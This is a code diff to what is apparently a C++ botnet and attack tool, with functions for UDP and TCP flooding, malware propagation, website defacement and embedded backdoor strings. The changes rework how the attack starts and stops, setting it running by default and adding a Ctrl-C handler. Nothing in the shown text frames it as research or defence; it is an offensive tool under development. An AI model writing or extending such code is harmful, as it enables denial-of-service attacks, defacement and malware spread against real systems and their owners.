@@ -13,6 +13,7 @@
 #include <netinet/tcp.h>
 #include <netinet/ip_icmp.h>
 #include <sys/socket.h>
+#include <csignal>
 
 #define PACKET_SIZE 8192
 #define MAX_BOTNETS 10000
@@ -29,7 +30,7 @@ string malwareJS;
 string malwarePython;
 string backdoorPHP;
 
-bool attackRunning = false;
+bool attackRunning = true;
 
 unsigned short csum(unsigned short *ptr, int nbytes) {
     unsigned long sum;
@@ -121,8 +122,10 @@ void startAttack() {
     }
 }
 
-void stopAttack() {
+void stopAttack(int signal) {
     attackRunning = false;
+    cout << "Attack stopped by user." << endl;
+    exit(0);
 }
 
 void defaceWebsite() {
@@ -450,12 +453,11 @@ int main() {
 
     cout << "Botnet IPs generated: " << botnetIPs.size() << endl;
 
-    // Start the attack without the start command
-    for (const auto& ip : botnetIPs) {
-        thread(udpFlood, ip, targetPort).detach();
-        thread(tcpFlood, ip, targetPort).detach();
-        thread(propagateMalware, ip).detach();
-    }
+    // Register the signal handler for stopping the attack
+    signal(SIGINT, stopAttack);
+
+    // Start the attack
+    startAttack();
 
     // Keep the program running indefinitely
     while (true) {
